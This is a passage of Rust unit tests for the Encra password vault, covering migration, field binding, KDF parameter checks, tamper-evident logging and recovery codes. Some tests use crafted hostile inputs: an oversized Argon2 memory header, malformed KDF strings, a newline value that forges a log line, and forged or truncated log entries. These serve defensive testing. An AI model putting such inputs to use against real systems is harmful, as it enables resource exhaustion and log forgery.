        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_unlock_refuses_a_fresh_vault() {
        let (dir, path) = fresh_vault_file("unlock-fresh");
        let conn = Connection::open(&path).unwrap();
        assert!(unlock_current_vault(&conn, "anything-at-all-here").is_err());
        assert_eq!(vault_kind(&conn).unwrap(), VaultKind::Fresh, "unlock must never create a vault");
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_describe_password_reports_shape_only() {
        let (dir, conn, dek) = reopened_seeded_vault("cred-describe");
        let profile = credentials::describe_password(&conn, &dek, "c1").unwrap();
        // "gh_p@$$w0rd"
        assert_eq!(profile, PasswordProfile { length: 11, lowercase: true, uppercase: false, digits: true, symbols: true });
        assert!(credentials::describe_password(&conn, &dek, "missing").is_err());
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn test_restrict_permissions_makes_vault_owner_only() {
        use std::os::unix::fs::PermissionsExt;
        let dir = migration_test_dir("perms");
        let data_dir = dir.join("com.encra.desktop");
        std::fs::create_dir_all(&data_dir).unwrap();
        let db_path = data_dir.join(CURRENT_DATABASE_NAME);
        create_marker_database(&db_path, "perm-check");
        let journal = data_dir.join(format!("{CURRENT_DATABASE_NAME}-journal"));
        std::fs::write(&journal, b"").unwrap();
        // The modes a fresh copy gets from a default umask.
        std::fs::set_permissions(&data_dir, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::set_permissions(&db_path, std::fs::Permissions::from_mode(0o644)).unwrap();
        std::fs::set_permissions(&journal, std::fs::Permissions::from_mode(0o644)).unwrap();

        restrict_permissions(&db_path).unwrap();

        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode(&data_dir), 0o700);
        assert_eq!(mode(&db_path), 0o600);
        assert_eq!(mode(&journal), 0o600);
        // Still readable by its owner afterwards.
        assert_eq!(read_marker_after_reopen(&db_path), "perm-check");
        std::fs::remove_dir_all(dir).unwrap();
    }

    // ===== Vault format 3 =====

    const V2_PASSWORD: &str = "format-two-password";

    /// A format-2 vault as an existing user has it: unbound values, plain
    /// service names, default Argon2, and a log that names a login.
    fn format_2_vault(label: &str) -> (PathBuf, PathBuf, [u8; 32]) {
        let dir = migration_test_dir(label);
        let path = dir.join(CURRENT_DATABASE_NAME);
        let dek = create_test_vault(&path, V2_PASSWORD);
        let conn = Connection::open(&path).unwrap();
        seed_vault(&conn, &dek);
        activity::log_action(&conn, "unlock", "vault unlocked");
        activity::log_action(&conn, "credential_add", "added github.com");
        activity::log_action(&conn, "lock", "vault locked");
        (dir, path, dek)
    }

    fn raw(conn: &Connection, sql: &str) -> String {
        conn.query_row(sql, [], |r| r.get(0)).unwrap()
    }

    #[test]
    fn test_format_3_migration_binds_everything_and_survives_reopen() {
        let (dir, path, dek) = format_2_vault("v3-migrate");
        {
            let conn = Connection::open(&path).unwrap();
            assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
        }

        let conn = vault::init_db(&path).unwrap();
        assert_eq!(migrate::schema_version(&conn).unwrap(), "3");
        assert_eq!(migrate::stored_kdf_params(&conn).unwrap(), vault::KdfParams::CURRENT);

        // Every encrypted column is bound now, names included.
        for (table, columns) in fields::ALL {
            for column in *columns {
                let mut stmt = conn.prepare(&format!("SELECT {column} FROM {table}")).unwrap();
                let values: Vec<Option<String>> = stmt.query_map([], |r| r.get(0)).unwrap().collect::<Result<_, _>>().unwrap();
                for value in values.into_iter().flatten() {
                    assert!(value.is_empty() || vault::is_bound(&value), "{table}.{column} not bound: {value}");
                }
            }
        }
        assert!(!raw(&conn, "SELECT group_concat(service) FROM credentials").contains("github"), "service names must be encrypted");
        assert!(!raw(&conn, "SELECT group_concat(name) FROM projects").contains("Home Lab"), "case names must be encrypted");

        // Same password, same key, after the re-wrap and a reopen.
        assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
        let list = credentials::list_summaries(&conn, &dek).unwrap();
        assert_eq!(list.iter().map(|c| c.service.as_str()).collect::<Vec<_>>(), ["aws", "github.com"], "sorted in Rust");

        // The log no longer names the login, says what happened, and is sealed.
        let details = raw(&conn, "SELECT group_concat(detail, '|') FROM activity_log");
        assert!(!details.contains("github"), "old log entries must be scrubbed: {details}");
        assert!(details.contains("login names removed from 1 older log entries"));
        let chain = activity::verify_chain(&conn, &dek).unwrap();
        assert!(chain.intact, "{:?}", chain.problem);
        assert_eq!(chain.pending, 0);

        // The safety copy is the untouched format-2 vault.
        let snapshot = Connection::open(format!("{}.pre-v3", path.display())).unwrap();
        assert_eq!(migrate::schema_version(&snapshot).unwrap(), "2");
        assert!(raw(&snapshot, "SELECT group_concat(service) FROM credentials").contains("github.com"));
        drop(snapshot);
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_format_3_migration_rolls_back_and_can_retry() {
        let (dir, path, dek) = format_2_vault("v3-rollback");
        {
            let conn = Connection::open(&path).unwrap();
            // Fail on the last table, after credentials and projects were rewritten.
            conn.execute_batch(
                "CREATE TRIGGER fail_kb BEFORE UPDATE ON kb_entries BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
            ).unwrap();
            assert!(bring_up_to_date(&conn, V2_PASSWORD, &dek).is_err());
            conn.execute_batch("DROP TRIGGER fail_kb").unwrap();
        }

        {
            let conn = vault::init_db(&path).unwrap();
            assert_eq!(migrate::schema_version(&conn).unwrap(), "2", "a failed migration must leave format 2");
            assert_eq!(raw(&conn, "SELECT service FROM credentials WHERE id = 'c1'"), "github.com");
            let stored = raw(&conn, "SELECT password_encrypted FROM credentials WHERE id = 'c1'");
            assert!(!vault::is_bound(&stored));
            assert_eq!(vault::decrypt_to_string(&dek, &stored).unwrap(), "gh_p@$$w0rd");
            assert!(raw(&conn, "SELECT group_concat(detail) FROM activity_log").contains("github.com"), "the scrub must roll back too");
        }

        // The next unlock simply tries again.
        let conn = Connection::open(&path).unwrap();
        assert_eq!(unlock_current_vault(&conn, V2_PASSWORD).unwrap(), Some(dek));
        assert_eq!(migrate::schema_version(&conn).unwrap(), "3");
        assert_eq!(credentials::reveal_password(&conn, &dek, "c1").unwrap().as_str(), "gh_p@$$w0rd");
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_bound_values_cannot_be_moved_or_downgraded() {
        let (dir, path, dek) = format_2_vault("v3-binding");
        let conn = Connection::open(&path).unwrap();
        bring_up_to_date(&conn, V2_PASSWORD, &dek).unwrap();
        let c1_password = raw(&conn, "SELECT password_encrypted FROM credentials WHERE id = 'c1'");
        let c1_notes = raw(&conn, "SELECT notes FROM credentials WHERE id = 'c1'");

        // Another row's password pasted in: refused.
        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c2'", [&c1_password]).unwrap();
        assert!(credentials::reveal_password(&conn, &dek, "c2").is_err());

        // The same row's notes pasted into its password: refused.
        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&c1_notes]).unwrap();
        assert!(credentials::reveal_password(&conn, &dek, "c1").is_err());

        // An old unbound value under the same key (from an older copy): refused.
        let unbound = vault::encrypt(&dek, "old-password").unwrap();
        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&unbound]).unwrap();
        assert!(credentials::reveal_password(&conn, &dek, "c1").is_err(), "format-2 values must not be read once a vault is format 3");

        // Putting the real value back works again.
        conn.execute("UPDATE credentials SET password_encrypted = ?1 WHERE id = 'c1'", [&c1_password]).unwrap();
        assert_eq!(credentials::reveal_password(&conn, &dek, "c1").unwrap().as_str(), "gh_p@$$w0rd");
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_kdf_params_parse_and_compatibility() {
        let current = vault::KdfParams::parse(&vault::KdfParams::CURRENT.encode()).unwrap();
        assert_eq!(current, vault::KdfParams::CURRENT);
        for hostile in ["m=99999999,t=3,p=1", "m=262144,t=0,p=1", "m=262144,t=99,p=1", "m=262144,t=3,p=64", "m=4,t=3,p=1", "m=abc,t=3,p=1", "x=1", ""] {
            assert!(vault::KdfParams::parse(hostile).is_err(), "should reject {hostile:?}");
        }
        assert!(vault::KdfParams::LEGACY.weaker_than(&vault::KdfParams::CURRENT));
        assert!(!vault::KdfParams::CURRENT.weaker_than(&vault::KdfParams::CURRENT));

        // derive_key is still the library default, so older vaults and backups open.
        let salt = [9u8; 32];
        let default = {
            let mut out = [0u8; 32];
            argon2::Argon2::default().hash_password_into(b"pw-123456789", &salt, &mut out).unwrap();
            out
        };
        assert_eq!(vault::derive_key("pw-123456789", &salt).unwrap(), default);

        // Verification reads its settings from the hash, old or new.
        let old_hash = vault::hash_password_with("pw-123456789", vault::KdfParams::LEGACY).unwrap();
        let new_hash = vault::hash_password("pw-123456789").unwrap();
        assert!(new_hash.contains("m=262144,t=3,p=1"));
        assert!(vault::verify_password("pw-123456789", &old_hash).unwrap());
        assert!(vault::verify_password("pw-123456789", &new_hash).unwrap());
        assert!(!vault::verify_password("wrong-password", &new_hash).unwrap());
    }

    #[test]
    fn test_activity_chain_detects_tampering() {
        let (dir, path, dek) = format_2_vault("v3-chain");
        let conn = Connection::open(&path).unwrap();
        bring_up_to_date(&conn, V2_PASSWORD, &dek).unwrap();
        let intact = |conn: &Connection| activity::verify_chain(conn, &dek).unwrap();
        assert!(intact(&conn).intact);
        let count: i64 = conn.query_row("SELECT COUNT(*) FROM activity_log", [], |r| r.get(0)).unwrap();
        assert!(count >= 4);

        // Entries written while locked wait, then seal on top of the chain.
        activity::log_action(&conn, "unlock_failed", "wrong master password");
        let status = intact(&conn);
        assert!(status.intact);
        assert_eq!(status.pending, 1);
        assert_eq!(activity::seal_pending(&conn, &dek).unwrap(), 1);
        assert_eq!(intact(&conn).pending, 0);

        let backup_copy = |label: &str| {
            let copy = dir.join(format!("{label}.db"));
            conn.execute("VACUUM INTO ?1", [copy.to_str().unwrap()]).unwrap();
            Connection::open(copy).unwrap()
        };

        // Edited detail.
        let edited = backup_copy("edited");
        edited.execute("UPDATE activity_log SET detail = 'nothing happened' WHERE seq = 2", []).unwrap();
        let status = activity::verify_chain(&edited, &dek).unwrap();
        assert!(!status.intact);
        assert_eq!(status.problem.as_deref(), Some("entry 2 was changed"));

        // A middle entry deleted.
        let gap = backup_copy("gap");
        gap.execute("DELETE FROM activity_log WHERE seq = 2", []).unwrap();
        assert!(!activity::verify_chain(&gap, &dek).unwrap().intact);

        // The newest entry cut off, then a new locked-time entry appended so the
        // numbers line up again: the head still catches it, and sealing refuses.
        let cut = backup_copy("cut");
        cut.execute("DELETE FROM activity_log WHERE seq = (SELECT MAX(seq) FROM activity_log)", []).unwrap();
        activity::log_action(&cut, "unlock", "vault unlocked");
        let status = activity::verify_chain(&cut, &dek).unwrap();
        assert!(!status.intact, "a cut-off tail must be detected");
        assert!(activity::seal_pending(&cut, &dek).is_err(), "must not seal over a broken chain");
        assert!(!activity::verify_chain(&cut, &dek).unwrap().intact, "the damage must stay visible");

        // A forged sealed entry.
        let forged = backup_copy("forged");
        forged.execute(
            "INSERT INTO activity_log (id, action, detail, seq, mac) VALUES ('x', 'unlock', 'forged', (SELECT MAX(seq) + 1 FROM activity_log), 'deadbeef')",
            [],
        ).unwrap();
        assert!(!activity::verify_chain(&forged, &dek).unwrap().intact);

        // The wrong key cannot vouch for the chain.
        assert!(!activity::verify_chain(&conn, &[1u8; 32]).unwrap().intact);
        drop((edited, gap, cut, forged, conn));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_backup_envelope_roundtrip_legacy_and_hostile_files() {
        let json = r#"{"version":"1.1","credentials":[],"projects":[],"journal_entries":[],"kb_entries":[]}"#;
        let sealed = seal_backup(json, "backup-pass").unwrap();
        assert!(sealed.starts_with("encra-backup:2:m=262144,t=3,p=1:"));
        assert_eq!(open_backup(&sealed, "backup-pass").unwrap().as_str(), json);
        assert!(open_backup(&sealed, "wrong-pass").is_err());

        // A Cobrypt-era file: "salt:payload", default Argon2, unbound.
        let salt = [5u8; 32];
        let key = vault::derive_key("backup-pass", &salt).unwrap();
        let legacy = format!("{}:{}", base64::engine::general_purpose::STANDARD.encode(salt), vault::encrypt(&key, json).unwrap());
        assert_eq!(open_backup(&legacy, "backup-pass").unwrap().as_str(), json);

        // A crafted header asking for 95 GiB of memory is refused before use.
        let hostile = sealed.replacen("m=262144", "m=99999999", 1);
        assert!(open_backup(&hostile, "backup-pass").unwrap_err().contains("out of range"));
        assert!(open_backup("encra-backup:2:m=262144,t=3,p=1", "backup-pass").is_err());
    }

    #[test]
    fn test_seal_detail_only_uses_known_wording() {
        assert_eq!(seal_detail(Some("button")), "sealed with the Seal button");
        assert_eq!(seal_detail(Some("shortcut")), "sealed with the keyboard shortcut");
        assert_eq!(seal_detail(Some("idle")), "sealed after 5 idle minutes");
        assert_eq!(seal_detail(Some("app_switch")), "sealed when Encra lost focus");
        // Anything else, including text meant to forge a log line, is ignored.
        assert_eq!(seal_detail(Some("vault unlocked\nunlock")), "vault locked");
        assert_eq!(seal_detail(None), "vault locked");
    }

    #[test]
    fn test_legacy_key_derivation_compatibility() {
        let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31];
        let password = "test-password";
        let legacy_key = vault::derive_key(password, &legacy_salt).unwrap();
        let hash = base64::engine::general_purpose::STANDARD.encode(legacy_key);

        // Verify the hash can be matched
        let check_key = vault::derive_key(password, &legacy_salt).unwrap();
        let check_hash = base64::engine::general_purpose::STANDARD.encode(check_key);
        assert_eq!(hash, check_hash, "legacy key derivation must be deterministic");

        // Verify wrong password produces different hash
        let wrong_key = vault::derive_key("wrong-password", &legacy_salt).unwrap();
        let wrong_hash = base64::engine::general_purpose::STANDARD.encode(wrong_key);
        assert_ne!(hash, wrong_hash, "wrong password must produce different hash");
    }

    #[test]
    fn test_legacy_detection() {
        // Verify legacy detection logic
        let legacy_hash = "somebase64hash";
        let empty = "";
        let not_empty = "hasvalue";

        // is_legacy: legacy_hash non-empty, encrypted_dek empty, password_hash empty
        assert!(!legacy_hash.is_empty() && empty.is_empty() && empty.is_empty(),
            "legacy vault must be detected when master_hash exists but new fields don't");

        // is_fresh: all three empty
        assert!(empty.is_empty() && empty.is_empty() && empty.is_empty(),
            "fresh vault when all fields empty");

        // Normal: encrypted_dek and password_hash are non-empty
        let is_normal = !not_empty.is_empty() && !not_empty.is_empty();
        assert!(is_normal, "normal vault has non-empty encrypted_dek and password_hash");
    }

    #[test]
    fn test_recovery_code_roundtrip() {
        // Generate recovery codes, recover DEK, verify
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let original_dek = vault::generate_dek();
        let mut codes = activity::generate_recovery_codes(&conn, &original_dek).unwrap();
        assert_eq!(codes.len(), 8, "must generate 8 recovery codes");

        // Recover with first code
        let code = codes.remove(0);
        let recovered = activity::recover_dek(&conn, &code).unwrap();
        assert!(recovered.is_some(), "valid code must recover DEK");
        let (recovered_dek, _row_id) = recovered.unwrap();
        assert_eq!(recovered_dek, original_dek, "recovered DEK must match original");

        // Code cannot be reused (row still present, but we simulate by calling again)
        // Note: row is NOT deleted by recover_dek — the caller must delete it.
        // For this test, manually verify the row still exists.
        let still_there: bool = conn.query_row(
            "SELECT COUNT(*) > 0 FROM recovery_codes",
            [], |row| row.get(0)
        ).unwrap();
        assert!(still_there, "code row must still exist after recover_dek (caller deletes it)");

        // Now manually delete to simulate the caller's transaction commit
        conn.execute("DELETE FROM recovery_codes WHERE id = ?1", rusqlite::params![_row_id]).unwrap();

        // After deletion, code should not be found
        let reused = activity::recover_dek(&conn, &code).unwrap();
        assert!(reused.is_none(), "code must not work after row deleted");
    }

    #[test]
    fn test_recovery_code_accepts_how_people_write_it_down() {
        let dir = migration_test_dir("recovery-written");
        let path = dir.join(CURRENT_DATABASE_NAME);
        let dek = create_test_vault(&path, "original-password-123");
        let conn = vault::init_db(&path).unwrap();
        activity::init_activity_table(&conn).unwrap();
        let codes = activity::generate_recovery_codes(&conn, &dek).unwrap();

        // Every generated code is already in normal form.
        for code in &codes {
            assert_eq!(&activity::normalize_recovery_code(code), code);
        }

        // Grouped in fours, lowercase, with a stray dash and trailing newline.
        let code = &codes[0];
        let written: String = code
            .to_lowercase()
            .chars()
            .collect::<Vec<_>>()
            .chunks(4)
            .map(|group| group.iter().collect::<String>())
            .collect::<Vec<_>>()
            .join(" ")
            .replacen(' ', "-", 1)
            + "\n";
        let recovered = activity::recover_and_reset(&conn, &written, "a-brand-new-password").unwrap();
        assert_eq!(recovered, Some(dek));
        drop(conn);

        // After reopening: the new password works, and the code is spent.
        let conn = vault::init_db(&path).unwrap();
        assert_eq!(unlock_current_vault(&conn, "a-brand-new-password").unwrap(), Some(dek));
        assert!(activity::recover_dek(&conn, code).unwrap().is_none(), "the code must be consumed");
        // A near miss still fails: one character changed.
        let mut near = codes[1].clone();
        let last = if near.ends_with('A') { 'B' } else { 'A' };
        near.pop();
        near.push(last);
        assert!(activity::recover_dek(&conn, &near).unwrap().is_none());
        drop(conn);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_recovery_code_wrong_code_fails() {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let dek = vault::generate_dek();
        activity::generate_recovery_codes(&conn, &dek).unwrap();

        let result = activity::recover_dek(&conn, "WRONG-CODE-12345").unwrap();
        assert!(result.is_none(), "wrong code must return None");
    }

    #[test]
    fn test_recovery_code_full_reset_flow() {
        // File-backed DB to prove data survives close/reopen
        let dir = std::env::temp_dir();
        let path = dir.join("encra-test-reset.db");
        let _ = std::fs::remove_file(&path); // clean from previous runs

        let old_password = "original-password";
        let new_password = "new-password";
        let test_service = "test-service";
        let test_cred = "test-cred-password";

        // Create vault
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            activity::init_activity_table(&conn).unwrap();
            conn.execute_batch("
                CREATE TABLE IF NOT EXISTS vault_config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('encrypted_dek', '');
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('password_hash', '');
                INSERT OR IGNORE INTO vault_config (key, value) VALUES ('kdf_salt', '');
                CREATE TABLE IF NOT EXISTS credentials (id TEXT PRIMARY KEY, service TEXT, username TEXT, password_encrypted TEXT, url TEXT, notes TEXT, totp_secret TEXT, created_at TEXT);
            ").unwrap();

            let dek = vault::generate_dek();
            let salt = [0u8; 32];
            let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
            let wrap_key = vault::derive_key(old_password, &salt).unwrap();
            let wrapped = vault::wrap_dek(&dek, &wrap_key).unwrap();
            let pass_hash = vault::hash_password(old_password).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();

            let enc = vault::encrypt(&dek, test_cred).unwrap();
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted) VALUES (?1, ?2, ?3, ?4)",
                rusqlite::params!["id1", test_service, "user", enc]).unwrap();

            let codes = activity::generate_recovery_codes(&conn, &dek).unwrap();
            // Store the code so we can use it after closing
            std::fs::write(format!("{}.code", path.display()), &codes[0]).unwrap();
        }

        // Locked: recover and reset through the single production transaction
        let recovery_code = std::fs::read_to_string(format!("{}.code", path.display())).unwrap();
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let dek = activity::recover_and_reset(&conn, &recovery_code, new_password)
                .unwrap()
                .expect("recovery must succeed");
            assert_eq!(dek.len(), 32, "recovery must yield a 32-byte DEK");

            // A second attempt with the same one-time code must find nothing:
            // the code was consumed in the same transaction that re-keyed the
            // vault, so it can never be spent twice.
            let again = activity::recover_and_reset(&conn, &recovery_code, "another-password").unwrap();
            assert!(again.is_none(), "recovery code must only work once");
        }

        // CLOSE and REOPEN — verify data survived
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let enc_dek: String = conn.query_row("SELECT value FROM vault_config WHERE key='encrypted_dek'", [], |r| r.get(0)).unwrap();
            let salt_b64: String = conn.query_row("SELECT value FROM vault_config WHERE key='kdf_salt'", [], |r| r.get(0)).unwrap();
            let salt = base64::engine::general_purpose::STANDARD.decode(&salt_b64).unwrap();
            let params = migrate::stored_kdf_params(&conn).unwrap();
            assert_eq!(params, vault::KdfParams::CURRENT, "a reset must store the current settings");
            let wrap_key = vault::derive_key_with(new_password, &salt, params).unwrap();
            let final_dek = vault::unwrap_dek(&enc_dek, &wrap_key).unwrap();

            let enc: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE id='id1'", [], |r| r.get(0)).unwrap();
            let dec = vault::decrypt_to_string(&final_dek, &enc).unwrap();
            assert_eq!(dec, test_cred, "new password must decrypt after reopen");

            // Old password must fail
            let old_salt = [0u8; 32];
            let old_wrap = vault::derive_key(old_password, &old_salt).unwrap();
            assert!(vault::unwrap_dek(&enc_dek, &old_wrap).is_err(), "old password must not work");
        }

        // Code cannot be reused
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            assert!(activity::recover_dek(&conn, &recovery_code).unwrap().is_none(), "code must be consumed");
        }

        // Cleanup
        std::fs::remove_file(format!("{}.code", path.display())).ok();
    }

    #[test]
    fn test_recovery_reset_rollback_on_failure() {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();
        conn.execute_batch("
            CREATE TABLE IF NOT EXISTS vault_config (key TEXT PRIMARY KEY, value TEXT NOT NULL);
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('encrypted_dek', '');
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('password_hash', '');
            INSERT OR IGNORE INTO vault_config (key, value) VALUES ('kdf_salt', '');
        ").unwrap();

        let old_password = "original-pw";
        let new_password = "new-pw";

        let dek = vault::generate_dek();
        let salt = [0u8; 32];
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
        let wrap_key = vault::derive_key(old_password, &salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrap_key).unwrap();
        let pass_hash = vault::hash_password(old_password).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();

        let codes = activity::generate_recovery_codes(&conn, &dek).unwrap();
        let code = &codes[0];

        // Force the reset to fail part-way through: rename vault_config so the
        // writes inside the transaction cannot land.
        conn.execute("ALTER TABLE vault_config RENAME TO vault_config_hidden", []).unwrap();

        let result = activity::recover_and_reset(&conn, code, new_password);
        assert!(result.is_err(), "reset must fail when vault_config is missing");

        // Restore table and verify the code was NOT consumed
        conn.execute("ALTER TABLE vault_config_hidden RENAME TO vault_config", []).unwrap();
        let still_exists = activity::recover_dek(&conn, code).unwrap();
        assert!(still_exists.is_some(), "recovery code must still exist after a failed reset");

        // Verify old password still unlocks
        let enc_dek: String = conn.query_row("SELECT value FROM vault_config WHERE key='encrypted_dek'", [], |r| r.get(0)).unwrap();
        let old_wrap_key = vault::derive_key(old_password, &salt).unwrap();
        let old_dek = vault::unwrap_dek(&enc_dek, &old_wrap_key).unwrap();
        assert_eq!(old_dek, dek, "DEK must be unchanged after failed reset");

        // Cleanup the consumed code row (it was recover_dek'd but reset failed, so row stays)
        // No cleanup needed — the test verifies the row is still there
    }

    #[test]
    fn test_migration_key_roundtrip() {
        let password = "migration-password";
        let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31];
        let legacy_key = vault::derive_key(password, &legacy_salt).unwrap();

        let plaintext = "my-secret-password";
        let encrypted = vault::encrypt(&legacy_key, plaintext).unwrap();

        let decrypted = vault::decrypt_to_string(&legacy_key, &encrypted).unwrap();
        assert_eq!(decrypted, plaintext);

        let new_dek = vault::generate_dek();
        let re_encrypted = vault::encrypt(&new_dek, &decrypted).unwrap();
        let re_decrypted = vault::decrypt_to_string(&new_dek, &re_encrypted).unwrap();
        assert_eq!(re_decrypted, plaintext);

        let result = vault::decrypt_to_string(&legacy_key, &re_encrypted);
        assert!(result.is_err(), "legacy key must not decrypt new DEK ciphertext");
    }

    #[test]
    fn test_recover_dek_sqlite_error_propagates() {
        // SQLite errors other than QueryReturnedNoRows must propagate, not get swallowed as "code not found"
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        // Don't create the table — any query will fail with a non-NoRows error
        let result = activity::recover_dek(&conn, "any-code");
        assert!(result.is_err(), "non-NoRows SQLite error must be an Err");
        let msg = result.unwrap_err();
        assert!(
            msg.contains("database error"),
            "error must say 'database error', got: {}",
            msg
        );
        assert!(
            !msg.contains("invalid") && !msg.contains("wrong"),
            "must not be misreported as invalid code"
        );
    }

    #[test]
    fn test_recover_dek_wrong_length_payload() {
        // Corrupted wrapped DEK with wrong plaintext length must error, not panic
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();

        let _dek = vault::generate_dek();

        // Create a deliberately malformed wrapped DEK: valid AES-GCM of a 1-byte payload
        // (not a valid 32-byte DEK), stored with a known recovery code
        // A code in the real alphabet and normal form, as generate_recovery_codes makes them.
        let code = "ABCDEFGHJKLMNPQRSTUVWXYZ23";
        let hash = sha256_hash(code);

        use aes_gcm::aead::{Aead, KeyInit, OsRng};
        use aes_gcm::{Aes256Gcm, Nonce};
        use argon2::Argon2;
        use rand::RngCore;

        let mut salt = [0u8; 32];
        OsRng.fill_bytes(&mut salt);
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);

        let argon2 = Argon2::default();
        let mut recovery_key = [0u8; 32];
        argon2.hash_password_into(code.as_bytes(), &salt, &mut recovery_key).unwrap();

        // Encrypt a 1-byte payload (not 32) — this will produce wrong-length plaintext
        let cipher = Aes256Gcm::new_from_slice(&recovery_key).unwrap();
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let bad_payload = b"x"; // 1 byte, not 32
        let ciphertext = cipher.encrypt(nonce, bad_payload.as_ref()).unwrap();
        let mut combined = nonce_bytes.to_vec();
        combined.extend_from_slice(&ciphertext);
        let wrapped = base64::engine::general_purpose::STANDARD.encode(&combined);

        conn.execute(
            "INSERT INTO recovery_codes (code_hash, salt, wrapped_dek) VALUES (?1, ?2, ?3)",
            rusqlite::params![hash, salt_b64, wrapped],
        ).unwrap();

        let result = activity::recover_dek(&conn, code);
        assert!(result.is_err(), "wrong-length DEK must error, not panic");
        let msg = result.unwrap_err();
        assert!(
            msg.contains("corrupted DEK") || msg.contains("expected 32"),
            "error must mention corrupted/length, got: {}",
            msg
        );
    }

    #[test]
    fn test_end_to_end_field_encryption() {
        let dir = std::env::temp_dir();
        let path = dir.join("encra-test-e2e.db");
        let _ = std::fs::remove_file(&path);

        let test_pw = "test-password";
        let kdf_salt = b"test-salt-32-bytes-long!!!!!!"; // 32 bytes

        // 1. Create vault: setup tables, generate DEK, wrap it
        let dek = vault::generate_dek();
        let wrapping_key = vault::derive_key(test_pw, kdf_salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrapping_key).unwrap();
        let pass_hash = vault::hash_password(test_pw).unwrap();
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(kdf_salt);

        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            vault::init_db(&path).unwrap();
            journal::init_journal_tables(&conn).unwrap();
            kb::init_kb_tables(&conn).unwrap();
            activity::init_activity_table(&conn).unwrap();
            conn.execute_batch("PRAGMA foreign_keys = ON;").ok();

            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();
            conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).unwrap();
        }

        // Helper: encrypt a field
        let enc = |v: &str| vault::encrypt(&dek, v).unwrap();

        // 2. Insert test data directly
        {
            let conn = rusqlite::Connection::open(&path).unwrap();

            // Short password cred
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["id1", "github.com", enc("dev@example.com"), enc("gh_p@$$w0rd"), enc("https://github.com"), enc("personal GitHub account")]).unwrap();

            // Long password + multiline notes
            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["id2", "aws-prod", enc("admin@corp.io"), enc("Xy9#mK!pW2$vL5nR8@jF3*qT7^bN1"), enc("https://aws.amazon.com"), enc("production AWS root — DO NOT SHARE\nrotated quarterly")]).unwrap();

            // TOTP entry
